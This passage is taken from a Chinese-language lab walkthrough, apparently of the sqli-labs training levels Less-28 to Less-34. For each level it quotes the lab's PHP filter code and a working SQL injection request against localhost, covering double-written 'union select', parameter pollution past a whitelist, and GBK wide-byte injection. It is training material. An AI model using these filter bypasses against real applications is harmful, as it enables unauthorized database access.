class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                          <span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                            <span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                                     <span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);                               //Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);     <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个闭合把我坑了，查看源码发现还有个括号。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-28/?id=222&#x27;)%a0union%a0select%a01,md5(1),(&#x27;3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);                                //strip out /*</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);                          //Strip out --.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);                                   //Strip out #.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                  //Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);                               //Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                  //Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);     <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>把<code>union+select</code>一起双写</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-28a/?id=2333&#x27;)+unionunion+select+select+1,md5(1),(&#x27;3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>这关<code>index.php</code>没做限制，入口在<code>login.php</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//WAF implimentation with a whitelist approach..... only allows input to be Numeric.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$match</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$match</span>)<br>&#123;<br><span class="hljs-comment">//echo &quot;you are good&quot;;</span><br><span class="hljs-comment">//return $match;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br><span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>&#125;<br>&#125;<br><br><br><br><span class="hljs-comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;<br><span class="hljs-variable">$qs_array</span>= <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>&#123;<br><span class="hljs-variable">$val</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)<br>&#123;<br><span class="hljs-variable">$id_value</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里实现了一个WAF，白名单限制数字格式，模拟了一个场景，当使用同一个参数名传两次值的时候，WAF获取的是第一个参数，<code>PHP/Apache</code>获取的是第二个参数。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-29/login.php?id=1&#x27;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br>HTTP/1.1 302 Found<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Fri, 09 Aug 2024 09:56:14 GMT<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache/2.4.7 (Ubuntu)<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/5.5.9-1ubuntu4.14<br><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>hacked.php<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1450<br><span class="hljs-attribute">Keep-Alive</span><span class="hljs-punctuation">: </span>timeout=5, max=100<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><br>省略<br></code></pre></td></tr></table></figure><p>不发数字会302跳转，这里使用参数污染绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-29/login.php?id=1&amp;id=233&#x27;+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><p>同29，使用参数污染，闭合换成<code>&quot;</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-30/login.php?id=1&amp;id=222&quot;+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h1><p>同29，使用参数污染，闭合换成<code>&quot;)</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-31/login.php?id=1&amp;id=222&quot;)+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><p>过滤函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">preg_quote</span>(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          <span class="hljs-comment">//escape any backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);                               <span class="hljs-comment">//escape single quote with a backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                <span class="hljs-comment">//escape double quote with a backslash</span><br>      <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这几条语句是等价的，都是将反斜线替换为两个反斜线，原理是需要经过字符串转义和正则转义两层处理，奇怪的PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\\\/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\\\\/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">preg_quote</span>(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);<br></code></pre></td></tr></table></figure><p>这里设置了编码是gbk</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br></code></pre></td></tr></table></figure><p>宽字节注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-32/?id=222%df&#x27;+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>过滤函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span>= <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$string</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>也是gbk编码，宽字节注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-33/?id=222%df&#x27;+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h1><p>使用<code>addslashes</code>过滤了参数，使用宽字节注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-34/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: 